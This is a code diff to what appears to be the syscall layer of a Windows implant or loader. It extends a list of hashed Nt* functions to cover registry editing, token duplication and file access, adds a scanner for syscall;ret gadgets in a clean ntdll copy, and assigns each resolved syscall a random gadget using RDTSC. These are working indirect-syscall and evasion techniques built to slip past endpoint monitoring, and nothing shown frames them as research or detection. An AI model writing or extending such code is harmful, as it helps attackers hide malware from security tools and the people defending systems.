@@ -42,8 +42,20 @@ static const DWORD g_required_hashes[] = {
     HASH_NTWAITFORSINGLEOBJECT,
     HASH_NTQUEUEAPCTHREAD,
     HASH_NTOPENSECTION,
+    HASH_NTRESUMETHREAD,
+    HASH_NTTERMINATETHREAD,
+    HASH_NTREADFILE,
+    HASH_NTWRITEFILE,
     HASH_NTCREATESECTION,
     HASH_NTCONTINUE,
+    HASH_NTOPENKEY,
+    HASH_NTQUERYVALUEKEY,
+    HASH_NTSETVALUEKEY,
+    HASH_NTDELETEVALUEKEY,
+    HASH_NTCREATEKEY,
+    HASH_NTOPENPROCESSTOKEN,
+    HASH_NTDUPLICATETOKEN,
+    HASH_NTQUERYDIRECTORYFILE,
 };
 
 #define REQUIRED_COUNT (sizeof(g_required_hashes) / sizeof(g_required_hashes[0]))
@@ -93,6 +105,45 @@ PVOID sc_find_gadget(PVOID clean_ntdll) {
     }
 
     return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/*  sc_find_gadgets — locate all syscall;ret (0F 05 C3) in ntdll .text  */
+/* ------------------------------------------------------------------ */
+
+DWORD sc_find_gadgets(PVOID ntdll_base, PVOID *pool, DWORD max_gadgets) {
+    DWORD count = 0;
+    PBYTE base = (PBYTE)ntdll_base;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    if (dos->e_magic != 0x5A4D)
+        return 0;
+
+    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
+    if (nt->Signature != 0x00004550)
+        return 0;
+
+    /* Walk sections to find executable (.text) section */
+    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
+        (PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (sec[i].Characteristics & 0x20000000) {  /* IMAGE_SCN_MEM_EXECUTE */
+            PBYTE p   = base + sec[i].VirtualAddress;
+            PBYTE end = p + sec[i].VirtualSize - 3;
+
+            while (p < end && count < max_gadgets) {
+                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
+                    pool[count++] = (PVOID)p;
+                    p += 3;  /* skip past this gadget */
+                } else {
+                    p++;
+                }
+            }
+        }
+    }
+
+    return count;
 }
 
 /* ------------------------------------------------------------------ */
@@ -211,11 +262,18 @@ NTSTATUS sc_init(SYSCALL_TABLE *table) {
 
     table->clean_ntdll = clean_base;
 
-    /* ----- Step 2: Find syscall;ret gadget ----- */
+    /* ----- Step 2: Find syscall;ret gadget pool ----- */
 
-    PVOID gadget = sc_find_gadget(clean_base);
-    if (!gadget)
-        return STATUS_PROCEDURE_NOT_FOUND;
+    table->gadget_count = sc_find_gadgets(clean_base, table->gadget_pool, MAX_GADGETS);
+
+    /* Fallback to single gadget if pool scan found nothing */
+    if (table->gadget_count == 0) {
+        PVOID gadget = sc_find_gadget(clean_base);
+        if (!gadget)
+            return STATUS_PROCEDURE_NOT_FOUND;
+        table->gadget_pool[0] = gadget;
+        table->gadget_count = 1;
+    }
 
     /* ----- Step 3: Resolve SSNs for all required Nt* functions ----- */
 
@@ -228,9 +286,14 @@ NTSTATUS sc_init(SYSCALL_TABLE *table) {
         if (idx >= SYSCALL_TABLE_CAPACITY)
             break;
 
-        table->entries[idx].ssn          = ssn;
-        table->entries[idx].syscall_addr = gadget;
-        table->entries[idx].hash         = g_required_hashes[i];
+        table->entries[idx].ssn  = ssn;
+        table->entries[idx].hash = g_required_hashes[i];
+
+        /* Assign a random gadget from the pool using RDTSC-based selection */
+        DWORD tick;
+        __asm__ volatile ("rdtsc" : "=a" (tick) : : "edx");
+        table->entries[idx].syscall_addr = table->gadget_pool[tick % table->gadget_count];
+
         table->count++;
     }
 
